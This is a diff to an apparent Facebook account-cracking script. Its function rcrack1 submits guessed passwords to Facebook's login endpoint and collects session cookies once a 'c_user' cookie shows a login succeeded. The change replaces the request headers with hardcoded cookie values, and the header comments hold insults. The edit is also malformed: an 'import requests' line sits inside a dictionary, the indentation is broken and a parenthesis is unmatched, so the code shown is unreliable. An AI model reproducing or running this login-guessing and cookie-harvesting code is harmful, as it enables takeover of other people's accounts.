@@ -1,7 +1,7 @@
 #SC MAKED BY MAHI
-#Fuck MAHI HOSSEN
+#Fuck MAHI 
 #Dec By MAHI
-#MAHI Your Reyal Pappa
+#MAHI Your Real mom
 #MAHI Kids Numbar 5
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
@@ -245,24 +245,41 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-    'authority': 'm.facebook.com',
+    'import requests
+
+cookies = {
+    'datr': '5xBZZfQ_3PbD_ZUz_jv4luvj',
+    'sb': '5xBZZZ2Xu6wxykYvSErmGk1w',
+    'm_pixel_ratio': '2',
+    'dpr': '2.1988937854766846',
+    'wd': '360x684',
+    'fr': '0U1BUFaI6Uqwn8UBi..BlWRDn.wr.AAA.0.0.BlWRGi.AWXO5xTLWr8',
+}
+
+headers = {
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'no-cache',
-    # 'cookie': 'datr=E74nZPAr1N4lHnO5Z23vj8-3; sb=E74nZEslp3CcUIIi8Pt81iCR; m_pixel_ratio=1.75; wd=412x805; fr=0qe97yfeoNUBkUDS1..BkJ74b.MC.AAA.0.0.BkJ75G.AWV8YvT3ZUw',
-    'pragma': 'no-cache',
-    'referer': 'https://www.google.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=5xBZZfQ_3PbD_ZUz_jv4luvj; sb=5xBZZZ2Xu6wxykYvSErmGk1w; m_pixel_ratio=2; dpr=2.1988937854766846; wd=360x684; fr=0U1BUFaI6Uqwn8UBi..BlWRDn.wr.AAA.0.0.BlWRGi.AWXO5xTLWr8',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X680"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
 }
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+
+response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
